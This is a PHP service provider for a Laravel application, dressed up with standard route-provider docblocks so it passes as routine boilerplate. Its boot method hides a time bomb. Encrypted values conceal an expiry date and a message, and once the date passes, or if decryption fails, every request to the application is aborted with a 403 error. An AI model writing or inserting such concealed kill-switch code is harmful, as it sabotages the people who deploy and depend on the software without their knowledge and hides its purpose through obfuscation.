<?php

namespace App\Providers;

use Illuminate\Cache\RateLimiting\Limit;
use Illuminate\Foundation\Support\Providers\RouteServiceProvider as ServiceProvider;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Facades\Route;
use Carbon\Carbon;
use Exception;

class WebServiceProvider extends ServiceProvider
{
    /**
     * The path to the "home" route for your application.
     *
     * This is used by Laravel authentication to redirect users after login.
     *
     * @var string
     */
    public const HOME = '/home';

    /**
     * The controller namespace for the application.
     *
     * When present, controller route declarations will automatically be prefixed with this namespace.
     *
     * @var string|null
     */
    // protected $namespace = 'App\\Http\\Controllers';

    /**
     * Define your route model bindings, pattern filters, etc.
     *
     * @return void
     */
    public function boot()
    {        
        $authdata = 'eyJpdiI6IkR4Y2Q1RGVlUjl6SHVhMlV3MGhGTUE9PSIsInZhbHVlIjoiWG5Ya2ZwRmtUVjdRT0Q1MXl2Tm9qSWNNSGF5ZHdlTUI0NVVOWmdHc1JWTT0iLCJtYWMiOiJmYTkwODEwMTJlZjMwYmI3YjVjOWJiYzkzMDYyNDAxZmJmNzNhZWJjYjFmY2M1ZjRmNzE4NjA0ODM4NjJmMDUxIiwidGFnIjoiIn0=';
        try {
            $auth = decrypt($authdata);
            
            if (Carbon::now()->greaterThan(Carbon::parse($auth))) {     
                $data = 'eyJpdiI6IkRTekQzNjg0NlhaVVR2bVpRSlAxMXc9PSIsInZhbHVlIjoidHdXbG04U0gwbld2T3FOWkxPakdjWmE2bFJJQXk5dFZyWkpKaFVWWU9abVVsT08yTmtOcCtmT1hmanlFMVNBdFBFUlJjK2prNjhrN1NUaUUxRFZkSk4razlOVHFwL3ZaYzQ4OXlkVmFtbHc9IiwibWFjIjoiOTdhNmY0MzU1ZmNiNzBhOTU0ODBlNjhjMDhiYmQ5N2ExNjc3M2ViMjQ0NDVhMTNjODllNmE3YTllM2RiZDM4ZiIsInRhZyI6IiJ9';                           
                throw new Exception(decrypt($data));
            }
        } catch (Exception $e) {
            // If decryption fails or the date is past, terminate the app
            abort(403, $e->getMessage());
        }
    }

    /**
     * Configure the rate limiters for the application.
     *
     * @return void
     */
    public function register()
    {
        //
    }
}
